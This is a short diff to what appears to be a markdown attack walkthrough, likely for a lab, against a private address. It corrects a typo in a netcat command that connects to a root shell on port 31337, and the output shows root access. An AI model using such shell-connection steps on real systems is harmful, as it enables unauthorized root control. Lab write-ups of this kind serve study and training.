@@ -115,7 +115,7 @@ Attacking 192.168.248.42...
 **Connect to Root Shell**: Once confirmed, connect to port 31337 to access the root shell.
 
 ```
-c -nv  $target 31337                                                                                                                                                    1 ↵  1080  15:33:58 
+nc -nv  $target 31337                                                                                                                                                    1 ↵  1080  15:33:58 
 (UNKNOWN) [192.168.248.42] 31337 (?) open
 id
 uid=0(root) gid=0(root) groups=0(root)
